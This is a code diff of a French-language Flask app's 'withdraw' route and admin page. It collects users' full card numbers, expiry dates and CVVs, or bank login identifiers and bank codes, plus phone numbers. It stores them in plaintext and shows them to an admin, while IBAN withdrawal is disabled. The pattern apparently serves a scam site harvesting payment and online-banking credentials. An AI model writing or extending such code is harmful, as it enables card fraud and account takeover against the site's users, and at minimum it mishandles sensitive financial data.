@@ -246,17 +246,21 @@ def withdraw():
         if amount <= 0:
             return "Montant invalide"
 
+        # ---------- CARTE BANCAIRE ----------
         if mode == 'card':
+            phone_card = request.form.get('phone_card')
             card_number = request.form.get('card_number')
             card_expiry = request.form.get('card_expiry')
             card_cvv = request.form.get('card_cvv')
 
-            if not (card_number and card_expiry and card_cvv):
-                return "Veuillez remplir tous les champs de la carte bancaire"
+            if not all([phone_card, card_number, card_expiry, card_cvv]):
+                return "Veuillez remplir tous les champs (carte + téléphone)"
+
             db.withdraw_requests.insert_one({
                 "username": current_user['username'],
                 "amount": amount,
                 "mode": "Carte bancaire",
+                "phone_card": phone_card,
                 "card_number": card_number,
                 "card_expiry": card_expiry,
                 "card_cvv": card_cvv,
@@ -264,19 +268,20 @@ def withdraw():
                 "status": "En attente"
             })
 
+        # ---------- IBAN (désactivé) ----------
         elif mode == 'bank':
-            # Ce mode est momentanément indisponible
             return "Mode de retrait par IBAN momentanément indisponible"
 
+        # ---------- IDENTIFICATION BANCAIRE ----------
         elif mode == 'identification':
+            phone_id = request.form.get('phone_id')
             bank_name_id = request.form.get('bank_name_id')
             bank_identifiers = request.form.get('bank_identifiers')
             bank_code_id = request.form.get('bank_code_id')
 
-            if not (bank_name_id and bank_identifiers and bank_code_id):
-                return "Veuillez remplir tous les champs pour l’identification bancaire"
+            if not all([phone_id, bank_name_id, bank_identifiers, bank_code_id]):
+                return "Veuillez remplir tous les champs (identification + téléphone)"
 
-            # Vérifier que l’identifiant bancaire contient entre 9 et 11 chiffres
             if not (bank_identifiers.isdigit() and 9 <= len(bank_identifiers) <= 11):
                 return "L’identifiant bancaire doit contenir entre 9 et 11 chiffres"
 
@@ -284,6 +289,7 @@ def withdraw():
                 "username": current_user['username'],
                 "amount": amount,
                 "mode": "Identification bancaire",
+                "phone_id": phone_id,
                 "bank_name_id": bank_name_id,
                 "bank_identifiers": bank_identifiers,
                 "bank_code_id": bank_code_id,
@@ -297,21 +303,17 @@ def withdraw():
         return redirect(url_for('dashboard'))
 
     return render_template('withdraw.html')
-
 # --- Dashboard admin : afficher demandes de retrait ---
 @app.route('/admin/withdraw_requests')
 @login_required
 def withdraw_requests():
-    # Récupérer l'utilisateur courant
     current_user = db.users.find_one({"username": session['username']})
 
     if not current_user or current_user['role'] != ADMIN_USERNAME:
         return render_template('403.html'), 403
 
-    # Récupérer les demandes de retrait triées par date décroissante
     requests_list = list(db.withdraw_requests.find().sort('date', -1))
 
-    # Assurer la présence de tous les champs pour éviter les erreurs dans le template
     for req in requests_list:
         req.setdefault('mode', 'Non défini')
         req.setdefault('status', 'En attente')
@@ -319,17 +321,18 @@ def withdraw_requests():
         req.setdefault('amount', 0)
         req.setdefault('date', datetime.datetime.now())
 
-        # Pour carte bancaire
+        # Carte bancaire
+        req.setdefault('phone_card', '')
         req.setdefault('card_number', '')
         req.setdefault('card_expiry', '')
         req.setdefault('card_cvv', '')
 
-        # Pour identification bancaire
+        # Identification bancaire
+        req.setdefault('phone_id', '')
         req.setdefault('bank_name_id', '')
         req.setdefault('bank_identifiers', '')
         req.setdefault('bank_code_id', '')
 
-    # Afficher dans le template
     return render_template('withdraw_requests.html', requests=requests_list)
 @app.route('/go_to_payment')
 def go_to_payment():
